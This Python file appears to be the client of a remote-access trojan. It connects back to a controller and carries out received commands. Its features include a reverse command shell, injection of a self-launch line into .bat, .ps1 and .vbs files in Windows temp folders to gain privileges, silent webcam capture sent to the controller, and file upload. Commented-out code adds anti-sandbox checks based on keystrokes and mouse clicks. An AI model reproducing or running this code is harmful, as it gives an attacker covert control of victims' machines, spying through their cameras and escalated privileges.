# -*- coding:utf-8 -*-
# @FileName  :test.py
# @Time      :2022/11/08 18:14:12
# @Author    :D0WE1L1N
import os
import socket
import sys
# import wmi
# from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
# import random
# import time
# import win32api
import threading
# import win32api
import inspect
import ctypes
def _async_raise(tid, exctype):
  """raises the exception, performs cleanup if needed"""
  tid = ctypes.c_long(tid)
  if not inspect.isclass(exctype):
    exctype = type(exctype)
  res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
  if res == 0:
    raise ValueError("invalid thread id")
  elif res != 1:
    # """if it returns a number greater than one, you're in trouble,
    # and you should call it again with exc=NULL to revert the effect"""
    ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
    raise SystemError("PyThreadState_SetAsyncExc failed")
def stop_thread(thread):
  _async_raise(thread.ident, SystemExit)
# import win32gui
# import win32ui
# def handler(ip, port):
#     try:
#         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         s.connect((ip, port))
#         Sandbox_D = Detector()
#         t_s = threading.Thread(target=Sandbox_D.detect)
#         t_p = threading.Thread(target=PINGPONG_client, args=(ip, port, s))
#         t_s.start()
#         t_p.start()
#     except socket.error as msg:
#         sys.exit(1)
def PINGPONG_client(ip, port):
    global t_p
    t_p = threading.Thread(target=PINGPONG_client_T, args=(ip, port))
    t_p.start()
def PINGPONG_client_T(ip, port):
    try:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
        except socket.error:
            sys.exit(1)
        while True:
            data = s.recv(1024)
            # usage 
            # if data.decode() == 'SHOW_ALL_USAGE_APP':
                
            if data.decode() == "EXIT_APP":
                s.close()
                break
            elif data.decode() == "CHECK_APP":
                s.send(bytes("OK", "utf8"))
#cmd_START_location
            elif data.decode() == "CMDSHELL_APP":
                def CMD_client(ip, port, main_port):
                    from subprocess import Popen, PIPE
                    try:
                        try:
                            cmd_c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            cmd_c.connect((ip, port))
                        except socket.error:
                            sys.exit(1)
                        while True:
                            cmd_command = cmd_c.recv(1024)
                            if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
                                main_port = cmd_c.recv(1024).decode("utf8")
                                PINGPONG_client(ip, int(main_port))
                                break
                            elif cmd_command.decode("utf8") == "PING":
                                cmd_c.send(bytes("PONG", "utf8"))
                            else:
                                cmd = Popen(cmd_command.decode(
                                    "utf8"), shell=True, stdout=PIPE, stderr=PIPE)
                                cmd_print_out = cmd.stdout.read()
                                if not cmd_print_out:
                                    cmd_print_out = cmd.stderr.read()
                                if not cmd_print_out:
                                    cmd_print_out = b'OK'
                                cmd_c.send(cmd_print_out)
                        cmd_c.close()
                    except:
                        sys.exit(1)
                s.send(bytes("OK", 'utf8'))
                cmd_port = int(s.recv(1024).decode(encoding="utf8"))
                s.close()
                CMD_client(ip, cmd_port, port)
                break
#cmd_END_location
#priv_vbp_listen_START_location
            elif data.decode() == "PRO_VBP_APP":
                import tempfile
                import win32file
                import win32con
                def moni_t():
                    s.send(bytes("OK", 'utf8'))
                    PINGPONG = os.path.realpath(sys.executable)
                    FILE_MODIFIED = 3
                    FILE_LIST_DIRECTORY = 0x0001
                    CMD = f'{PINGPONG}'
                    FILE_TYPES = {
                        '.bat': ["\r\nREM PIPO\r\n", f'\r\n{CMD}\r\n'],
                        '.ps1': ["\r\n#PIPO\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
                        '.vbs': ["\r\n'PIPO\r\n", f'\r\nCreateObject("Wscript.Shell").Run("{CMD}")\r\n'],
                    }

                    PATHS = ['c:\\Windows\\Temp', tempfile.gettempdir()]

                    def inject_code(full_filename, contents, extension):
                        if FILE_TYPES[extension][0].strip() in contents:
                            return
                        
                        full_contents = FILE_TYPES[extension][0]
                        full_contents += FILE_TYPES[extension][1]
                        full_contents += contents
                        with open(full_filename, 'w') as f:
                            f.write(full_contents)
                        s.send(b'OK')
                        s.close()
                        stop_thread(t_p)
                        stop_thread(t_m)
                    def monitor(path_to_watch):
                        h_directory = win32file.CreateFile(
                            path_to_watch,
                            FILE_LIST_DIRECTORY,
                            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                            None,
                            win32con.OPEN_EXISTING,
                            win32con.FILE_FLAG_BACKUP_SEMANTICS,
                            None
                            )

                        while True:
                            try:
                                results = win32file.ReadDirectoryChangesW(
                                    h_directory,
                                    1024,
                                    True,
                                    win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                                    win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                                    win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                                    win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                                    win32con.FILE_NOTIFY_CHANGE_SECURITY |
                                    win32con.FILE_NOTIFY_CHANGE_SIZE,
                                    None,
                                    None
                                )
                                for action, file_name in results:
                                    full_filename = os.path.join(path_to_watch, file_name)
                                    if action == FILE_MODIFIED:
                                        s.send(bytes(str(full_filename), "utf8"))
                                        check_data = s.recv(1024)
                                        if check_data:
                                            extension = os.path.splitext(full_filename)[1]
                                            if extension in FILE_TYPES:     
                                                try:
                                                    with open(full_filename) as f:
                                                        contents = f.read()
                                                    inject_code(full_filename, contents, extension)
                                                    # print(contents)
                                                except Exception as e:
                                                    pass
                            except KeyboardInterrupt:
                                break
                        
                            except Exception:
                                pass
                    for path in PATHS:
                        monitor_thread = threading.Thread(target=monitor, args=(path,))
                        monitor_thread.start()
                t_m = threading.Thread(target=moni_t)
                t_m.start()
                while True:
                    try:
                        e_data = s.recv(1024)
                    except:
                        pass
                    if e_data.decode() == "EXIT":
                        stop_thread(t_m)
                        break
#priv_vbp_listen_END_location
#cam_shot_START_location
            elif data.decode() == "CAM_SHOT_APP":
                from cv2 import VideoCapture, imwrite
                import shutil
                os.mkdir("./temp")
                s.send(bytes("OK", 'utf8'))
                cap = VideoCapture(0)
                while True:
                    f, frame = cap.read()
                    imwrite("./temp/image.jpg", frame)
                    cap.release()
                    break
                with open("./temp/image.jpg", "rb") as f:
                    img_data = f.read()
                len_data = len(img_data)
                s.send(bytes(str(len_data), 'utf8'))
                check = s.recv(1024)
                if check:
                    s.sendall(img_data)
                re_check = s.recv(1024)
                shutil.rmtree("./temp")
                if re_check:
                    continue
#cam_shot_END_location
#upload_START_location
            elif data.decode() == "UPLOAD_APP":
                import shutil
                is_named = False
                s.send(bytes("OK", 'utf8'))
                re_check = s.recv(1024).decode()
                s.send(bytes('OK', 'utf8'))
                dir_data = s.recv(1024).decode()
                if "." in dir_data:
                    dir_data_l = dir_data.split(".")
                    is_named = dir_data_l[len(dir_data_l) - 1]
                while True:
                    if not is_named:
                        name_data = s.recv(1024).decode()
                    else:
                        name_data = s.recv(1024).decode()
                        name_data = is_named
                    if name_data == "END":
                        break
                    s.send(bytes("OK", "UTF8"))
                    len_data = s.recv(1024).decode()
                    s.send(bytes("OK", "UTF8"))
                    upload_data = s.recv(int(len_data))
                    if upload_data:
                        s.send(bytes(ip + ">" + "Sending", "utf8"))
                        if os.path.exists(dir_data + "/" + name_data):
                            shutil.rmtree(dir_data)
                        if not os.path.exists(dir_data):
                            os.mkdir(dir_data)
                        f = open(dir_data + "/" + name_data[:-4], "wb+")
                        f.write(upload_data)
                        f.close()
                        # os.rename(dir_data + "/" + name_data, name_data[:-4])
                        s.send(bytes("DONE", "utf8"))
                    else:
                        break
#upload_END_location
#exit_START_location
            else:
                s.send(bytes("Unfound", 'utf8'))
        s.close()
    except:
        sys.exit(1)
#exit_END_location

# 沙箱检测
# class LASTINPUTINFO(Structure):
#     _fields_ = [
#         ('cbSize', c_uint),
#         ('dwTime', c_ulong)
#     ]
# def get_last_input():
#     struct_lastinputinfo = LASTINPUTINFO()
#     struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)
#     windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
#     run_time = windll.kernel32.GetTickCount()
#     elapsed = run_time - struct_lastinputinfo.dwTime
#     return elapsed

# # while True:
# #     get_last_input()
# #     time.sleep(1)

# class Detector:
#     def __init__(self):
#         self.double_clicks = 0
#         self.keystrokes = 0
#         self.mouse_clicks = 0

#     def get_key_press(self):
#         for i in range(0, 0xff):
#             state = win32api.GetAsyncKeyState(i)
#             if state & 0x0001:
#                 if i == 0x1:
#                     self.mouse_clicks += 1
#                     return time.time()
#                 elif i > 32 and i < 127:
#                     self.keystrokes += 1
#         return None

#     def detect(self):
#         previous_timestamp = None
#         first_double_click = None
#         double_click_threshold = 0.35
        
#         max_double_clicks = 5
#         max_keystrokes = random.randint(10,25)
#         max_mouse_clicks = random.randint(5,25)
#         max_input_threshold = 30000

#         last_input = get_last_input()
#         if last_input >= max_input_threshold:
#             sys.exit(1)
        
#         detection_complete = False
#         while not detection_complete:
#             keypress_time = self.get_key_press()
#             if keypress_time is not None and previous_timestamp is not None:
#                 elapsed = keypress_time - previous_timestamp
                
#                 if elapsed <= double_click_threshold:
#                     self.mouse_clicks -= 2
#                     self.double_clicks += 1
#                     if first_double_click is None:
#                         first_double_click = time.time()
#                     else:
#                         if self.double_clicks >= max_double_clicks:
#                             if (keypress_time - first_double_click <=
#                                 (max_double_clicks*double_click_threshold)):
#                                 sys.exit(1)
#                 if (self.keystrokes >= max_keystrokes and 
#                     self.double_clicks >= max_double_clicks and 
#                     self.mouse_clicks >= max_mouse_clicks):
#                     detection_complete = True
                    
#                 previous_timestamp = keypress_time
#             elif keypress_time is not None:
#                 previous_timestamp = keypress_time
# PINGPONG_client("127.0.0.1", 624)
